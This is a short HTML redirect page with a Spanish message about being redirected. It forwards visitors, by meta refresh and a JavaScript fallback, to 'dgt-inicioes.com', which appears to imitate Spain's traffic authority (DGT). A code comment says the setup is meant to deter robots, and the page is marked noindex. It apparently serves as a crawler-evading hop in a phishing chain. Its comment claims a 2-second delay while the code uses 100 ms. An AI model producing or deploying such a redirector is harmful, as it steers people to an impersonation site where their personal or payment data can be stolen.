<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>Redirection</title>
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="refresh" content="4; URL=https://dgt-inicioes.com/index/t/">
        <script type="text/javascript">
            // JavaScript redirection as a fallback with delay to deter robots
            setTimeout(function() {
                window.location.href = "https://dgt-inicioes.com/index/t/";
            }, 100); // Delay set to 2 seconds
        </script>
    </head>
    <body>
        <p>Ser√°s redirigido en unos segundos.</p>
    </body>
</html>
